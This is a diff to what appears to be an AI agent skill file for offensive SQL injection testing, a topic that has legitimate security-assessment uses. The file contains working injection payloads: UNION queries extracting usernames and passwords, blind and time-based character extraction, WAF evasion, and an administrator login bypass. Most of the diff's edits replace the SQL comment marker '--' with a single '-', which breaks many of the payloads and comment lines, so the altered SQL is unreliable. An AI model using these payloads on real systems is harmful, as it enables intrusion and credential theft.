@@ -1,6 +1,6 @@
 ---
 name: sql-injection-testing
-description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
+description: "Execute SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
 risk: offensive
 date_added: "2026-02-27"
 version: 1.0.0
@@ -25,7 +25,7 @@ Execute comprehensive SQL injection vulnerability assessments on web application
 - SQLMap installation for automated exploitation
 - Browser with developer tools enabled
 
-### Technical Requirements
+### Requirements
 
 - Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
 - Knowledge of HTTP request/response cycle
@@ -55,7 +55,7 @@ Execute comprehensive SQL injection vulnerability assessments on web application
 - Database dumps (sanitized)
 - Payload documentation
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: Detection and Reconnaissance
 
@@ -142,9 +142,9 @@ UNION SELECT 'a',NULL,NULL--
 UNION SELECT NULL,'a',NULL--
 
 -- Extract data
-UNION SELECT username,password,NULL FROM users--
-UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
-UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+UNION SELECT username,password,NULL FROM users-
+UNION SELECT table_name,NULL,NULL FROM information_schema.tables-
+UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-
 ```
 
 #### Error-Based Extraction
@@ -168,11 +168,11 @@ Infer data through application behavior changes:
 
 ```sql
 -- Character extraction
-1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
-1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-
+1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'-
 
 -- Conditional responses
-1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
+1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0-
 ```
 
 #### Time-Based Blind Extraction
@@ -182,7 +182,7 @@ Use database sleep functions for confirmation:
 ```sql
 -- MySQL
 1' AND IF(1=1,SLEEP(5),0)--
-1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
+1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)-
 
 -- MSSQL
 1'; WAITFOR DELAY '0:0:5'--
@@ -222,7 +222,7 @@ admin'/*
 ') OR ('1'='1
 ') OR ('1'='1'--
 
--- Username enumeration
+- Username enumeration
 admin' AND '1'='1
 admin' AND '1'='2
 ```
@@ -232,8 +232,8 @@ Query transformation example:
 -- Original query
 SELECT * FROM users WHERE username='input' AND password='input'
 
--- Injected (username: admin'--)
-SELECT * FROM users WHERE username='admin'--' AND password='anything'
+- Injected (username: admin'-)
+SELECT * FROM users WHERE username='admin'-' AND password='anything'
 -- Password check bypassed via comment
 ```
 
@@ -257,7 +257,7 @@ U+0027 (apostrophe)
 U+02B9 (modifier letter prime)
 
 -- Hexadecimal strings (MySQL)
-SELECT * FROM users WHERE name=0x61646D696E  -- 'admin' in hex
+SELECT * FROM users WHERE name=0x61646D696E - 'admin' in hex
 ```
 
 #### Whitespace Bypass
@@ -270,8 +270,8 @@ SELECT/**/username/**/FROM/**/users
 SEL/**/ECT/**/username/**/FR/**/OM/**/users
 
 -- Alternative whitespace
-SELECT%09username%09FROM%09users  -- Tab character
-SELECT%0Ausername%0AFROM%0Ausers  -- Newline
+SELECT%09username%09FROM%09users - Tab character
+SELECT%0Ausername%0AFROM%0Ausers - Newline
 ```
 
 #### Keyword Bypass
@@ -357,14 +357,14 @@ SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
 
 ## Constraints and Guardrails
 
-### Operational Boundaries
+### Boundaries
 
 - Never execute destructive queries (DROP, DELETE, TRUNCATE) without explicit authorization
 - Limit data extraction to proof-of-concept quantities
 - Avoid denial-of-service through resource-intensive queries
 - Stop immediately upon detecting production database with real user data
 
-### Technical Limitations
+### Limitations
 
 - WAF/IPS may block common payloads requiring evasion techniques
 - Parameterized queries prevent standard injection
@@ -405,7 +405,7 @@ Response: Error (4 columns confirmed)
 
 **Data Extraction**:
 ```
-GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users-- HTTP/1.1
+GET /product.php?id=-5 UNION SELECT 1,username,password,4 FROM admin_users- HTTP/1.1
 Response: Displays admin credentials
 ```
 
@@ -422,7 +422,7 @@ id=5' AND SLEEP(5)--
 **Extract Database Name Length**:
 ```sql
 id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
--- Delay confirms database name is 8 characters
+- Delay confirms database name is 8 characters
 ```
 
 **Extract Characters**:
@@ -442,13 +442,13 @@ SELECT * FROM users WHERE username='[input]' AND password='[input]'
 
 **Injection Payload**:
 ```
-Username: administrator'--
+Username: administrator'-
 Password: anything
 ```
 
 **Resulting Query**:
 ```sql
-SELECT * FROM users WHERE username='administrator'--' AND password='anything'
+SELECT * FROM users WHERE username='administrator'-' AND password='anything'
 ```
 
 **Result**: Password check bypassed, authenticated as administrator.
